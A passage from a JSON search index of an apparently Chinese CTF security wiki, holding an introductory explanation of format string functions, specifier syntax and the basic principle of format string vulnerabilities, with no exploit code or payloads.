5f0f\u3002\u51e0\u4e4e\u6240\u6709\u7684C/C++\u7a0b\u5e8f\u90fd\u4f1a\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765\n\u8f93\u51fa\u4fe1\u606f\uff0c\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u6216\u8005\u5904\u7406\u5b57\u7b26\u4e32\n\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u5229\u7528\u7684\u65f6\u5019\u4e3b\u8981\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\u540e\u7eed\u53c2\u6570\uff0c\n\u53ef\u9009\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5176\u5b9e\u76f8\u4fe1\u5927\u591a\u6570\u4eba\u90fd\u63a5\u89e6\u8fc7printf\u51fd\u6570\u4e4b\u7c7b\u7684\u3002\u4e4b\u540e\u6211\u4eec\u518d\u4e00\u4e2a\u4e00\u4e2a\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\n\n\n\u5e38\u89c1\u7684\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6709\n\n\n\n\n\u8f93\u5165\n\n\nscanf\n\n\n\n\n\n\n\u8f93\u51fa\n\n\n\n\n\n\n\n\n\n\n\u51fd\u6570\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\n\n\n\n\n\n\n\n\nprintf\n\n\n\u8f93\u51fa\u5230stdout\n\n\n\n\n\n\nfprintf\n\n\n\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41\n\n\n\n\n\n\nvprintf\n\n\n\u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230 stdout\n\n\n\n\n\n\nvfprintf\n\n\n\u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41\n\n\n\n\n\n\nsprintf\n\n\n\u8f93\u51fa\u5230\u5b57\u7b26\u4e32\n\n\n\n\n\n\nsnprintf\n\n\n\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u6570\u5230\u5b57\u7b26\u4e32\n\n\n\n\n\n\nvsprintf\n\n\n\u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u5b57\u7b26\u4e32\n\n\n\n\n\n\nvsnprintf\n\n\n\u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u5230\u5b57\u7b26\u4e32\n\n\n\n\n\n\nsetproctitle\n\n\n\u8bbe\u7f6eargv\n\n\n\n\n\n\nsyslog\n\n\n\u8f93\u51fa\u65e5\u5fd7\n\n\n\n\n\n\nerr, verr, warn, vwarn\u7b49\n\n\n\u3002\u3002\u3002\n\n\n\n\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e86\u89e3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\uff0c\u5176\u57fa\u672c\u683c\u5f0f\u5982\u4e0b\n\n\n%[parameter][flags][field width][.precision][length]type\n\n\n\u6bcf\u4e00\u79cdpattern\u7684\u542b\u4e49\u8bf7\u5177\u4f53\u53c2\u8003\u7ef4\u57fa\u767e\u79d1\u7684\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n \u3002\u4ee5\u4e0b\u51e0\u4e2apattern\u4e2d\u7684\u5bf9\u5e94\u9009\u62e9\u9700\u8981\u91cd\u70b9\u5173\u6ce8\n\n\n\n\nparameter\n\n\nn$\uff0c\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u6307\u5b9a\u53c2\u6570\n\n\n\n\n\n\nflag\n\n\nfield width\n\n\n\u8f93\u51fa\u7684\u6700\u5c0f\u5bbd\u5ea6\n\n\n\n\n\n\nprecision\n\n\n\u8f93\u51fa\u7684\u6700\u5927\u957f\u5ea6\n\n\n\n\n\n\nlength\uff0c\u8f93\u51fa\u7684\u957f\u5ea6\n\n\nhh\uff0c\u8f93\u51fa\u4e00\u4e2a\u5b57\u8282\n\n\nh\uff0c\u8f93\u51fa\u4e00\u4e2a\u53cc\u5b57\u8282  \u200b\n\n\n\n\n\n\ntype\n\n\nd/i\uff0c\u6709\u7b26\u53f7\u6574\u6570\n\n\nu\uff0c\u65e0\u7b26\u53f7\u6574\u6570\n\n\nx/X\uff0c16\u8fdb\u5236unsigned int \u3002x\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1bX\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002\n\n\no\uff0c8\u8fdb\u5236unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002\n\n\ns\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u8f93\u51fanull\u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411wchar_t\u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528wcrtomb \u51fd\u6570\u3002\n\n\nc\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u628aint\u53c2\u6570\u8f6c\u4e3aunsigned char\u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u628awint_t\u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684wchart_t\u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3anull\u5bbd\u5b57\u7b26\u3002\n\n\np\uff0c void *\u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002printf(\"%p\",a)\u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cfa\u7684\u503c\uff0cprintf(\"%p\", \na)\u6253\u5370\u53d8\u91cfa\u6240\u5728\u7684\u5730\u5740\u3002\n\n\nn\uff0c\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002\n\n\n%\uff0c '\n%\n'\u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55flags, width\u3002\n\n\n\n\n\n\n\n\n\u53c2\u6570\n\n\n\u5c31\u662f\u76f8\u5e94\u7684\u8981\u8f93\u51fa\u7684\u53d8\u91cf\u3002\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\n\n\n\u5728\u4e00\u5f00\u59cb\uff0c\u6211\u4eec\u5c31\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u57fa\u672c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u518d\u8bf4\u4e00\u4e9b\u6bd4\u8f83\u7ec6\u81f4\u7684\u5185\u5bb9\u3002\u6211\u4eec\u4e0a\u9762\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u662f\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765\u8fdb\u884c\u89e3\u6790\u7684\u3002\n\u90a3\u4e48\u76f8\u5e94\u7684\u8981\u88ab\u89e3\u6790\u7684\u53c2\u6570\u7684\u4e2a\u6570\u4e5f\u81ea\u7136\u662f\u7531\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u63a7\u5236\n\u3002\u6bd4\u5982\u8bf4'%s'\u8868\u660e\u6211\u4eec\u4f1a\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u3002\n\n\n\u6211\u4eec\u518d\u7ee7\u7eed\u4ee5\u4e0a\u9762\u7684\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd\n\n\n\n\n\u5bf9\u4e8e\u8fd9\u6837\u7684\u4f8b\u5b50\uff0c\u5728\u8fdb\u5165printf\u51fd\u6570\u7684\u4e4b\u524d(\u5373\u8fd8\u6ca1\u6709\u8c03\u7528printf)\uff0c\u6808\u4e0a\u7684\u5e03\u5c40\u7531\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4f9d\u6b21\u5982\u4e0b\n\n\nsome value\n3.14\n123456\naddr of \nred\n\naddr of format string: Color %s...\n\n\n\n\n\u6ce8\uff1a\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe3.14\u4e0a\u9762\u7684\u503c\u4e3a\u67d0\u4e2a\u672a\u77e5\u7684\u503c\u3002\n\n\n\u5728\u8fdb\u5165printf\u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u4e00\u4e2a\u8bfb\u53d6\u5176\u5b57\u7b26\u4f1a\u9047\u5230\u4e24\u79cd\u60c5\u51b5\n\n\n\n\n\u5f53\u524d\u5b57\u7b26\u4e0d\u662f%\uff0c\u76f4\u63a5\u8f93\u51fa\u5230\u76f8\u5e94\u6807\u51c6\u8f93\u51fa\u3002\n\n\n\u5f53\u524d\u5b57\u7b26\u662f%\uff0c \u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26\n\n\n\u5982\u679c\u6ca1\u6709\u5b57\u7b26\uff0c\u62a5\u9519\n\n\n\u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u662f%,\u8f93\u51fa%\n\n\n\u5426\u5219\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\uff0c\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u8f93\u51fa\n\n\n\n\n\n\n\n\n\u90a3\u4e48\u5047\u8bbe\uff0c\u6b64\u65f6\u6211\u4eec\u5728\u7f16\u5199\u7a0b\u5e8f\u65f6\u5019\uff0c\u5199\u6210\u4e86\u4e0b\u9762\u7684\u6837\u5b50\n\n\nprintf\n(\nColor %s, Number %d, Float %4.2f\n);\n\n\n\n\n\n\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u5e76\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u5982\u4f55\u8fd0\u884c\u5462\uff1f\u7a0b\u5e8f\u7167\u6837\u4f1a\u8fd0\u884c\uff0c\u4f1a\u5c06\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u5740\u4e0a\u9762\u7684\u4e09\u4e2a\u53d8\u91cf\u5206\u522b\u89e3\u6790\u4e3a\n\n\n\n\n\u89e3\u6790\u5176\u5730\u5740\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\n\n\n\u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6574\u5f62\u503c\n\n\n\u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6d6e\u70b9\u503c\n\n\n\n\n\u5bf9\u4e8e2\uff0c3\u6765\u8bf4\u5012\u8fd8\u65e0\u59a8\uff0c\u4f46\u662f\u5bf9\u4e8e\u5bf9\u4e8e1\u6765\u8bf4\uff0c\u5982\u679c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4e0d\u53ef\u8bbf\u95ee\u5730\u5740\uff0c\u6bd4\u59820\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u56e0\u6b64\u800c\u5d29\u6e83\u3002\n\n\n\u8fd9\u57fa\u672c\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406\u4e86\u3002\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nhttps://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_1", 
            "text": "\u9996\u5148\uff0c\u5bf9\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u539f\u7406\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_2", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u5c06 \u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u5176\u6765\u89e3\u6790\u4e4b\u540e\u7684\u53c2\u6570 \u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u5c31\u662f\u5c06\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u8868\u793a\u7684\u6570\u636e\u8f6c\u5316\u4e3a\u6211\u4eec\u4eba\u7c7b\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\u683c\u5f0f\u3002\u51e0\u4e4e\u6240\u6709\u7684C/C++\u7a0b\u5e8f\u90fd\u4f1a\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765 \u8f93\u51fa\u4fe1\u606f\uff0c\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u6216\u8005\u5904\u7406\u5b57\u7b26\u4e32 \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u5229\u7528\u7684\u65f6\u5019\u4e3b\u8981\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206   \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570  \u683c\u5f0f\u5316\u5b57\u7b26\u4e32  \u540e\u7eed\u53c2\u6570\uff0c \u53ef\u9009   \u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5176\u5b9e\u76f8\u4fe1\u5927\u591a\u6570\u4eba\u90fd\u63a5\u89e6\u8fc7printf\u51fd\u6570\u4e4b\u7c7b\u7684\u3002\u4e4b\u540e\u6211\u4eec\u518d\u4e00\u4e2a\u4e00\u4e2a\u8fdb\u884c\u4ecb\u7ecd\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_3", 
            "text": "\u5e38\u89c1\u7684\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6709   \u8f93\u5165  scanf    \u8f93\u51fa      \u51fd\u6570  \u57fa\u672c\u4ecb\u7ecd      printf  \u8f93\u51fa\u5230stdout    fprintf  \u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41    vprintf  \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230 stdout    vfprintf  \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41    sprintf  \u8f93\u51fa\u5230\u5b57\u7b26\u4e32    snprintf  \u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u6570\u5230\u5b57\u7b26\u4e32    vsprintf  \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u5b57\u7b26\u4e32    vsnprintf  \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u5230\u5b57\u7b26\u4e32    setproctitle  \u8bbe\u7f6eargv    syslog  \u8f93\u51fa\u65e5\u5fd7    err, verr, warn, vwarn\u7b49  \u3002\u3002\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_4", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4e86\u89e3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\uff0c\u5176\u57fa\u672c\u683c\u5f0f\u5982\u4e0b  %[parameter][flags][field width][.precision][length]type \n\u6bcf\u4e00\u79cdpattern\u7684\u542b\u4e49\u8bf7\u5177\u4f53\u53c2\u8003\u7ef4\u57fa\u767e\u79d1\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32  \u3002\u4ee5\u4e0b\u51e0\u4e2apattern\u4e2d\u7684\u5bf9\u5e94\u9009\u62e9\u9700\u8981\u91cd\u70b9\u5173\u6ce8   parameter  n$\uff0c\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u6307\u5b9a\u53c2\u6570    flag  field width  \u8f93\u51fa\u7684\u6700\u5c0f\u5bbd\u5ea6    precision  \u8f93\u51fa\u7684\u6700\u5927\u957f\u5ea6    length\uff0c\u8f93\u51fa\u7684\u957f\u5ea6  hh\uff0c\u8f93\u51fa\u4e00\u4e2a\u5b57\u8282  h\uff0c\u8f93\u51fa\u4e00\u4e2a\u53cc\u5b57\u8282  \u200b    type  d/i\uff0c\u6709\u7b26\u53f7\u6574\u6570  u\uff0c\u65e0\u7b26\u53f7\u6574\u6570  x/X\uff0c16\u8fdb\u5236unsigned int \u3002x\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1bX\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002  o\uff0c8\u8fdb\u5236unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002  s\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u8f93\u51fanull\u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411wchar_t\u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528wcrtomb \u51fd\u6570\u3002  c\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u628aint\u53c2\u6570\u8f6c\u4e3aunsigned char\u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u628awint_t\u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684wchart_t\u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3anull\u5bbd\u5b57\u7b26\u3002  p\uff0c void *\u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002printf(\"%p\",a)\u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cfa\u7684\u503c\uff0cprintf(\"%p\",  a)\u6253\u5370\u53d8\u91cfa\u6240\u5728\u7684\u5730\u5740\u3002  n\uff0c\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002  %\uff0c ' % '\u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55flags, width\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_5", 
            "text": "\u5c31\u662f\u76f8\u5e94\u7684\u8981\u8f93\u51fa\u7684\u53d8\u91cf\u3002", 
            "title": "\u53c2\u6570"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_6", 
            "text": "\u5728\u4e00\u5f00\u59cb\uff0c\u6211\u4eec\u5c31\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u57fa\u672c\u4ecb\u7ecd\uff0c\u8fd9\u91cc\u518d\u8bf4\u4e00\u4e9b\u6bd4\u8f83\u7ec6\u81f4\u7684\u5185\u5bb9\u3002\u6211\u4eec\u4e0a\u9762\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u662f\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765\u8fdb\u884c\u89e3\u6790\u7684\u3002 \u90a3\u4e48\u76f8\u5e94\u7684\u8981\u88ab\u89e3\u6790\u7684\u53c2\u6570\u7684\u4e2a\u6570\u4e5f\u81ea\u7136\u662f\u7531\u8fd9\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u63a7\u5236 \u3002\u6bd4\u5982\u8bf4'%s'\u8868\u660e\u6211\u4eec\u4f1a\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32\u53c2\u6570\u3002  \u6211\u4eec\u518d\u7ee7\u7eed\u4ee5\u4e0a\u9762\u7684\u4e3a\u4f8b\u5b50\u8fdb\u884c\u4ecb\u7ecd   \u5bf9\u4e8e\u8fd9\u6837\u7684\u4f8b\u5b50\uff0c\u5728\u8fdb\u5165printf\u51fd\u6570\u7684\u4e4b\u524d(\u5373\u8fd8\u6ca1\u6709\u8c03\u7528printf)\uff0c\u6808\u4e0a\u7684\u5e03\u5c40\u7531\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4f9d\u6b21\u5982\u4e0b  some value\n3.14\n123456\naddr of  red \naddr of format string: Color %s...  \u6ce8\uff1a\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe3.14\u4e0a\u9762\u7684\u503c\u4e3a\u67d0\u4e2a\u672a\u77e5\u7684\u503c\u3002  \u5728\u8fdb\u5165printf\u4e4b\u540e\uff0c\u51fd\u6570\u9996\u5148\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u4e00\u4e2a\u8bfb\u53d6\u5176\u5b57\u7b26\u4f1a\u9047\u5230\u4e24\u79cd\u60c5\u51b5   \u5f53\u524d\u5b57\u7b26\u4e0d\u662f%\uff0c\u76f4\u63a5\u8f93\u51fa\u5230\u76f8\u5e94\u6807\u51c6\u8f93\u51fa\u3002  \u5f53\u524d\u5b57\u7b26\u662f%\uff0c \u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26  \u5982\u679c\u6ca1\u6709\u5b57\u7b26\uff0c\u62a5\u9519  \u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u662f%,\u8f93\u51fa%  \u5426\u5219\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\uff0c\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u8f93\u51fa     \u90a3\u4e48\u5047\u8bbe\uff0c\u6b64\u65f6\u6211\u4eec\u5728\u7f16\u5199\u7a0b\u5e8f\u65f6\u5019\uff0c\u5199\u6210\u4e86\u4e0b\u9762\u7684\u6837\u5b50  printf ( Color %s, Number %d, Float %4.2f );   \u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u5e76\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u90a3\u4e48\u7a0b\u5e8f\u4f1a\u5982\u4f55\u8fd0\u884c\u5462\uff1f\u7a0b\u5e8f\u7167\u6837\u4f1a\u8fd0\u884c\uff0c\u4f1a\u5c06\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u5740\u4e0a\u9762\u7684\u4e09\u4e2a\u53d8\u91cf\u5206\u522b\u89e3\u6790\u4e3a   \u89e3\u6790\u5176\u5730\u5740\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32  \u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6574\u5f62\u503c  \u89e3\u6790\u5176\u5185\u5bb9\u5bf9\u5e94\u7684\u6d6e\u70b9\u503c   \u5bf9\u4e8e2\uff0c3\u6765\u8bf4\u5012\u8fd8\u65e0\u59a8\uff0c\u4f46\u662f\u5bf9\u4e8e\u5bf9\u4e8e1\u6765\u8bf4\uff0c\u5982\u679c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4e0d\u53ef\u8bbf\u95ee\u5730\u5740\uff0c\u6bd4\u59820\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u56e0\u6b64\u800c\u5d29\u6e83\u3002  \u8fd9\u57fa\u672c\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u57fa\u672c\u539f\u7406\u4e86\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/#_7", 
            "text": "https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2", 
            "title": "\u53c2\u8003\u9605\u8bfb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/", 
